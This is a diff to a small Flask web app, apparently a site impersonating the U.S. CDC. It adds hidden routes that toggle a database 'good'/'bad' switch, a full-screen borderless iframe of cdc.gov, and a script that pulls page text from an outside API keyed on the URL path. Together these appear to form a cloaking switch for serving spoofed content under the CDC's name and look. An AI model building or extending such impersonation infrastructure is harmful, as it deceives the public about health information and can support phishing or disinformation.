@@ -13,6 +13,17 @@ col = db["dbmain"]
 @app.route("/")
 def hellop():
   return redirect("https://www.cdc.gov/", code=302)
+
+@app.route("/home")
+def hellope():
+  col.update_one({"status":"good"}, {"status":"bad"})
+  return redirect("https://www.cdc.gov/", code=302)
+
+@app.route("/site")
+def hellopu():
+  col.update_one({"status":"bad"}, {"status":"good"})
+  return redirect("https://www.cdc.gov/", code=302)
+  
 @app.route("/article/<path:text>")
 def hello(text):
   if col.find_one({"id":999})["status"] == "good":
@@ -22,6 +33,8 @@ def hello(text):
       <title>Centers for Disease Control and Prevention</title>
   </head>
   <body>
+  <iframe src="https://www.cdc.gov/" style="position:absolute; top:0; left:0; bottom:0; right:0; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;">
+    </iframe>
       <script>
           // URL of the API endpoint that provides the text
           var apiUrl = "https://api.zenga.eu.org/api"+window.location.pathname;
